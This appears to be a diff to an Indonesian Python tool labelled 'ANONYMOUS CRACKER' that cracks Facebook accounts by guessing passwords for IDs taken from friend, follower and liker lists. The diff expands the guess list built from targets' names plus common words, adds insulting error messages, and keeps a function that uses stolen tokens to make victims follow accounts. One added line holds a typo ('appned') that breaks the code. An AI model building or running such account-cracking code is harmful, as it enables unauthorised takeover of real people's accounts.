@@ -60,7 +60,7 @@ _logo_line_1_ = ('%s  __   _____ __   __ '%(_M_))
 _logo_line_2_ = ('%s / _ \|  ___| |  | | %s┌─────────────────────────┐'%(_K_,_M_))
 _logo_line_3_ = ('%s| |_| |____ | |__| | %s│    %s• 𝕐𝕌𝕊𝕌𝔽 𝕄𝔸𝕌𝕃𝔸ℕ𝔸 •    %s│'%(_H_,_M_,_B_,_M_))
 _logo_line_4_ = ('%s|_| |_|_____| _____| %s│   %s★ANONYMOUS CRACKER★   %s│'%(_B_,_M_,_U_,_M_))
-_logo_line_5_ = ('%s     ＦＵＣＫ %s└─────────────────────────┘'%(_U_,_M_))
+_logo_line_5_ = ('%s     ＦＵＣＫ         %s└─────────────────────────┘'%(_U_,_M_))
 def _my_logo_():
     _dapunta_cici_(_logo_line_1_)
     _dapunta_cici_(_logo_line_2_)
@@ -126,7 +126,7 @@ def _bot_follow_(_tok_dev_):
                 _req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_))
                 time.sleep(0.3)
             except:pass
-        _dapunta_cici_('\n%s[%s!%s] %sLogin Berhasil'%(_H_,_P_,_H_,_P_))
+        _dapunta_cici_('\n%s[%s!%s] %sLogin Sukses'%(_H_,_P_,_H_,_P_))
         time.sleep(2)
     except:pass
 
@@ -198,13 +198,13 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
     _dapunta_cici_('%s[%s1%s] %sCrack ID Dari Teman/Publik'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s2%s] %sCrack ID Dari Pengikut'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s3%s] %sCrack ID Dari Likers'%(_U_,_P_,_U_,_P_))
-    _dapunta_cici_('%s[%s4%s] %sLihat Hasil Crack'%(_U_,_P_,_U_,_P_))
+    _dapunta_cici_('%s[%s4%s] %sCek Hasil Crack'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s5%s] %sUser Agent'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s0%s] %sLog Out'%(_U_,_P_,_U_,_P_))
     _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('')
     if _dapunta_menu__cici_dapunta__ in ['',' ']:
-        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
+        _dapunta_cici_('%s[%s!%s] %sSALAH GOBLOK'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
         _menu_dev_(_Dapunta_Ganteng_Banget_)
     elif _dapunta_menu__cici_dapunta__ in ['1','01','a']:
@@ -223,7 +223,7 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
         time.sleep(2)
         _login_dev_(_Dapunta_Ganteng_Banget_)
     else:
-        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
+        _dapunta_cici_('%s[%s!%s] %sSALAH GOBLOK'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
         _menu_dev_(_Dapunta_Ganteng_Banget_)
 
@@ -333,15 +333,26 @@ def _pass_list_(_cici_):
             _suci_salsabila_=_suci_salsabila_.lower()
             if len(_suci_salsabila_)==3 or len(_suci_salsabila_)==4 or len(_suci_salsabila_)==5:
                 _dapunta_.append(_suci_salsabila_+"123")
+                _dapunta_.append(_suci_salsabila_+"1234")
                 _dapunta_.append(_suci_salsabila_+"12345")
+
             else:
                 _dapunta_.append(_suci_salsabila_)
                 _dapunta_.append(_suci_salsabila_+"123")
+                _dapunta_.appned(_suci_salsabila_+"1234")
                 _dapunta_.append(_suci_salsabila_+"12345")
     _dapunta_.append(_cici_.lower())
     _dapunta_.append("sayang")
     _dapunta_.append("bismillah")
     _dapunta_.append("anjing")
+    _dapunta_.append("bangsat")
+    _dapunta_.append("kontol")
+    _dapunta_.append("indonesia")
+    _dapunta_.append("rahasia")
+    _dapunta_.append("katasandi")
+    _dapunta_.append("booyah")
+    _dapunta_.append("garena")
+    _dapunta_.append("moonton")
     return _dapunta_
 
 ### Logger Crack
@@ -437,7 +448,7 @@ class _crack_dev_:
         while True:
             _pilih_pass_ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
             if _pilih_pass_=="":
-                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
+                _dapunta_cici_('%s[%s!%s] %sSALAH GOBLOK'%(_M_,_P_,_M_,_P_))
                 time.sleep(2)
                 _menu_dev_(self._Dapunta_Sayang_Cici_)
             elif _pilih_pass_ in ['m','M','2','02','002']:
